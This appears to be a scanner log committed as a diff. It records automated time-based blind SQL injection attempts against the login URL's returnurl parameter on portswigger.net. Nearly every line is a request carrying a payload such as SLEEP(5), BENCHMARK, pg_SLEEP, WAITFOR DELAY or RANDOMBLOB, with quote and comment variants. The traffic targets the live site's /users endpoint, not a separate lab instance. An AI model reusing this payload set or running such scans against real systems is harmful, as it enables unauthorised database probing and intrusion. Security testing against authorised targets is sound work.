+2024-07-26 12:17:27,807 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:28,921 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputwaitfor%20delay%20'00:00:05' HTTP/1.1" 200 None
+2024-07-26 12:17:29,254 - INFO - [12:17:29] Payload testing: waitfor delay '00:00:05'
+2024-07-26 12:17:29,254 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:30,386 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputwaitfor%20delay%20'00:00:05'-- HTTP/1.1" 200 None
+2024-07-26 12:17:30,684 - INFO - [12:17:30] Payload testing: waitfor delay '00:00:05'--
+2024-07-26 12:17:30,687 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:31,859 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputwaitfor%20delay%20'00:00:05' HTTP/1.1" 200 None
+2024-07-26 12:17:32,163 - INFO - [12:17:32] Payload testing: waitfor delay '00:00:05'#
+2024-07-26 12:17:32,166 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:33,251 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputbenchmark(50000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:17:33,550 - INFO - [12:17:33] Payload testing: benchmark(50000000,MD5(1))
+2024-07-26 12:17:33,550 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:34,617 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputbenchmark(50000000,MD5(1))-- HTTP/1.1" 200 None
+2024-07-26 12:17:34,899 - INFO - [12:17:34] Payload testing: benchmark(50000000,MD5(1))--
+2024-07-26 12:17:34,899 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:36,032 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputbenchmark(50000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:17:36,331 - INFO - [12:17:36] Payload testing: benchmark(50000000,MD5(1))#
+2024-07-26 12:17:36,331 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:37,497 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20benchmark(50000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:17:37,796 - INFO - [12:17:37] Payload testing: or benchmark(50000000,MD5(1))
+2024-07-26 12:17:37,812 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:38,881 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20benchmark(50000000,MD5(1))-- HTTP/1.1" 200 None
+2024-07-26 12:17:39,178 - INFO - [12:17:39] Payload testing: or benchmark(50000000,MD5(1))--
+2024-07-26 12:17:39,181 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:40,352 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20benchmark(50000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:17:40,632 - INFO - [12:17:40] Payload testing: or benchmark(50000000,MD5(1))#
+2024-07-26 12:17:40,632 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:41,777 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputpg_SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:17:42,159 - INFO - [12:17:42] Payload testing: pg_SLEEP(5)
+2024-07-26 12:17:42,159 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:43,426 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputpg_SLEEP(5)-- HTTP/1.1" 200 None
+2024-07-26 12:17:43,975 - INFO - [12:17:43] Payload testing: pg_SLEEP(5)--
+2024-07-26 12:17:43,991 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:45,207 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputpg_SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:17:45,566 - INFO - [12:17:45] Payload testing: pg_SLEEP(5)#
+2024-07-26 12:17:45,573 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:46,707 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20pg_SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:17:46,977 - INFO - [12:17:46] Payload testing: or pg_SLEEP(5)
+2024-07-26 12:17:46,979 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:48,084 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20pg_SLEEP(5)-- HTTP/1.1" 200 None
+2024-07-26 12:17:48,419 - INFO - [12:17:48] Payload testing: or pg_SLEEP(5)--
+2024-07-26 12:17:48,422 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:49,804 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20pg_SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:17:50,336 - INFO - [12:17:50] Payload testing: or pg_SLEEP(5)#
+2024-07-26 12:17:50,336 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:52,429 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'%5C%22 HTTP/1.1" 200 None
+2024-07-26 12:17:52,438 - INFO - [12:17:52] Payload testing: '\"
+2024-07-26 12:17:52,441 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:53,728 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputAnD%20SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:17:54,224 - INFO - [12:17:54] Payload testing: AnD SLEEP(5)
+2024-07-26 12:17:54,227 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:55,499 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputAnD%20SLEEP(5)-- HTTP/1.1" 200 None
+2024-07-26 12:17:55,915 - INFO - [12:17:55] Payload testing: AnD SLEEP(5)--
+2024-07-26 12:17:55,932 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:57,980 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputAnD%20SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:17:58,596 - INFO - [12:17:58] Payload testing: AnD SLEEP(5)#
+2024-07-26 12:17:58,596 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:18:00,579 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input&&SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:18:01,043 - INFO - [12:18:01] Payload testing: &&SLEEP(5)
+2024-07-26 12:18:01,044 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:18:02,227 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input&&SLEEP(5)-- HTTP/1.1" 200 None
+2024-07-26 12:18:02,606 - INFO - [12:18:02] Payload testing: &&SLEEP(5)--
+2024-07-26 12:18:02,609 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:18:04,708 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input&&SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:18:05,507 - INFO - [12:18:05] Payload testing: &&SLEEP(5)#
+2024-07-26 12:18:05,507 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:18:06,867 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'%20AnD%20SLEEP(5)%20ANd%20'1 HTTP/1.1" 200 None
+2024-07-26 12:18:07,145 - INFO - [12:18:07] Payload testing: ' AnD SLEEP(5) ANd '1
+2024-07-26 12:18:07,148 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:18:08,413 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'&&SLEEP(5)&&'1 HTTP/1.1" 200 None
+2024-07-26 12:18:08,753 - INFO - [12:18:08] Payload testing: '&&SLEEP(5)&&'1
+2024-07-26 12:18:08,754 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:18:10,104 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputORDER%20BY%20SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:18:10,403 - INFO - [12:18:10] Payload testing: ORDER BY SLEEP(5)
+2024-07-26 12:18:10,403 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:18:11,547 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputORDER%20BY%20SLEEP(5)-- HTTP/1.1" 200 None
+2024-07-26 12:18:11,849 - INFO - [12:18:11] Payload testing: ORDER BY SLEEP(5)--
+2024-07-26 12:18:11,852 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:18:12,995 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputORDER%20BY%20SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:18:13,315 - INFO - [12:18:13] Payload testing: ORDER BY SLEEP(5)#
+2024-07-26 12:18:13,318 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:18:14,443 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))ecMj) HTTP/1.1" 200 None
+2024-07-26 12:18:14,733 - INFO - [12:18:14] Payload testing: (SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+2024-07-26 12:18:14,749 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:18:15,798 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))ecMj) HTTP/1.1" 200 None
+2024-07-26 12:18:16,098 - INFO - [12:18:16] Payload testing: (SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+2024-07-26 12:18:16,115 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:18:17,382 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))ecMj)-- HTTP/1.1" 200 None
+2024-07-26 12:18:17,717 - INFO - [12:18:17] Payload testing: (SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
+2024-07-26 12:18:17,720 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:18:18,845 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input+benchmark(3200,SHA1(1))+' HTTP/1.1" 200 None
+2024-07-26 12:18:19,124 - INFO - [12:18:19] Payload testing: +benchmark(3200,SHA1(1))+'
+2024-07-26 12:18:19,127 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:18:20,263 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input+%20SLEEP(10)%20+%20' HTTP/1.1" 200 None
+2024-07-26 12:18:20,656 - INFO - [12:18:20] Payload testing: + SLEEP(10) + '
+2024-07-26 12:18:20,659 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:18:21,744 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputRANDOMBLOB(500000000/2) HTTP/1.1" 200 None
+2024-07-26 12:18:22,052 - INFO - [12:18:22] Payload testing: RANDOMBLOB(500000000/2)
+2024-07-26 12:18:22,054 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:18:23,218 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputAND%202947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) HTTP/1.1" 200 None
+2024-07-26 12:18:23,523 - INFO - [12:18:23] Payload testing: AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+2024-07-26 12:18:23,525 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:18:24,642 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputOR%202947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) HTTP/1.1" 200 None
+2024-07-26 12:18:24,957 - INFO - [12:18:24] Payload testing: OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+2024-07-26 12:18:24,957 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:18:26,144 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputRANDOMBLOB(1000000000/2) HTTP/1.1" 200 None
+2024-07-26 12:18:26,473 - INFO - [12:18:26] Payload testing: RANDOMBLOB(1000000000/2)
+2024-07-26 12:18:26,473 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:18:27,571 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputAND%202947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) HTTP/1.1" 200 None
+2024-07-26 12:18:27,872 - INFO - [12:18:27] Payload testing: AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+2024-07-26 12:18:27,875 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:18:29,036 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputOR%202947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) HTTP/1.1" 200 None
+2024-07-26 12:18:29,341 - INFO - [12:18:29] Payload testing: OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+2024-07-26 12:18:29,344 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:18:30,484 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputSLEEP(1)/*'%20or%20SLEEP(1)%20or%20'%22%20or%20SLEEP(1)%20or%20%22*/ HTTP/1.1" 200 None
+2024-07-26 12:18:30,786 - INFO - [12:18:30] Payload testing: SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+2024-07-26 12:21:05,174 - INFO - Starting testing...
+2024-07-26 12:21:05,179 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:06,505 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input1 HTTP/1.1" 200 None
+2024-07-26 12:21:06,858 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:08,015 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input HTTP/1.1" 200 None
+2024-07-26 12:21:08,315 - INFO - [12:21:08] Payload testing: # from wapiti
+2024-07-26 12:21:08,327 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:09,495 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputsleep(5) HTTP/1.1" 200 None
+2024-07-26 12:21:09,839 - INFO - [12:21:09] Payload testing: sleep(5)#
+2024-07-26 12:21:09,843 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:10,939 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input1%20or%20sleep(5) HTTP/1.1" 200 None
+2024-07-26 12:21:11,252 - INFO - [12:21:11] Payload testing: 1 or sleep(5)#
+2024-07-26 12:21:11,256 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:12,526 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22%20or%20sleep(5) HTTP/1.1" 200 None
+2024-07-26 12:21:12,866 - INFO - [12:21:12] Payload testing: " or sleep(5)#
+2024-07-26 12:21:12,870 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:14,002 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'%20or%20sleep(5) HTTP/1.1" 200 None
+2024-07-26 12:21:14,402 - INFO - [12:21:14] Payload testing: ' or sleep(5)#
+2024-07-26 12:21:14,402 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:15,585 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22%20or%20sleep(5)=%22 HTTP/1.1" 200 None
+2024-07-26 12:21:15,866 - INFO - [12:21:15] Payload testing: " or sleep(5)="
+2024-07-26 12:21:15,871 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:16,957 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'%20or%20sleep(5)=' HTTP/1.1" 200 None
+2024-07-26 12:21:17,282 - INFO - [12:21:17] Payload testing: ' or sleep(5)='
+2024-07-26 12:21:17,299 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:18,415 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input1)%20or%20sleep(5) HTTP/1.1" 200 None
+2024-07-26 12:21:18,760 - INFO - [12:21:18] Payload testing: 1) or sleep(5)#
+2024-07-26 12:21:18,764 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:20,031 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22)%20or%20sleep(5)=%22 HTTP/1.1" 200 None
+2024-07-26 12:21:20,398 - INFO - [12:21:20] Payload testing: ") or sleep(5)="
+2024-07-26 12:21:20,398 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:21,496 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input')%20or%20sleep(5)=' HTTP/1.1" 200 None
+2024-07-26 12:21:21,796 - INFO - [12:21:21] Payload testing: ') or sleep(5)='
+2024-07-26 12:21:21,796 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:22,987 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input1))%20or%20sleep(5) HTTP/1.1" 200 None
+2024-07-26 12:21:23,311 - INFO - [12:21:23] Payload testing: 1)) or sleep(5)#
+2024-07-26 12:21:23,311 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:24,682 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22))%20or%20sleep(5)=%22 HTTP/1.1" 200 None
+2024-07-26 12:21:24,963 - INFO - [12:21:24] Payload testing: ")) or sleep(5)="
+2024-07-26 12:21:24,967 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:26,346 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'))%20or%20sleep(5)=' HTTP/1.1" 200 None
+2024-07-26 12:21:26,741 - INFO - [12:21:26] Payload testing: ')) or sleep(5)='
+2024-07-26 12:21:26,746 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:27,913 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input;waitfor%20delay%20'0:0:5'-- HTTP/1.1" 200 None
+2024-07-26 12:21:28,271 - INFO - [12:21:28] Payload testing: ;waitfor delay '0:0:5'--
+2024-07-26 12:21:28,289 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:29,435 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input);waitfor%20delay%20'0:0:5'-- HTTP/1.1" 200 None
+2024-07-26 12:21:31,294 - INFO - [12:21:31] Payload testing: );waitfor delay '0:0:5'--
+2024-07-26 12:21:31,299 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:32,594 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input';waitfor%20delay%20'0:0:5'-- HTTP/1.1" 200 None
+2024-07-26 12:21:32,912 - INFO - [12:21:32] Payload testing: ';waitfor delay '0:0:5'--
+2024-07-26 12:21:32,916 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
